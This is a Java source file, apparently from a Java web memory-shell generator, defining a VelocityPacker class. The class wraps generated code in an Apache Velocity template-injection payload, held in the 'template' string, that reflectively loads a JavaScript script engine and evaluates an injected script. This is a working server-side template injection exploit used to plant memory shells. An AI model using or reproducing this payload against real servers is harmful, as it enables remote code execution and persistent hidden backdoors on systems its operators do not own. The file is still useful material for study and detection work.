package com.reajason.javaweb.memshell.packer.velocity;

import com.reajason.javaweb.memshell.config.GenerateResult;
import com.reajason.javaweb.memshell.packer.Packer;
import com.reajason.javaweb.memshell.packer.Packers;
import com.reajason.javaweb.memshell.packer.scriptengine.ScriptEnginePacker;
import org.apache.commons.io.IOUtils;

import java.io.IOException;
import java.nio.charset.Charset;
import java.util.Objects;

/**
 * @author ReaJason
 * @since 2024/12/13
 */
public class VelocityPacker implements Packer {
    String template = "#set($x='') #set($cz = $x.class.forName('javax.script.ScriptEngineManager')) $cz.getDeclaredConstructor(null).newInstance().getEngineByName('js').eval('{{script}}')";

    @Override
    public String pack(GenerateResult generateResult) {
        String script = Packers.ScriptEngine.getInstance().pack(generateResult);
        return template.replace("{{script}}", script);
    }
}
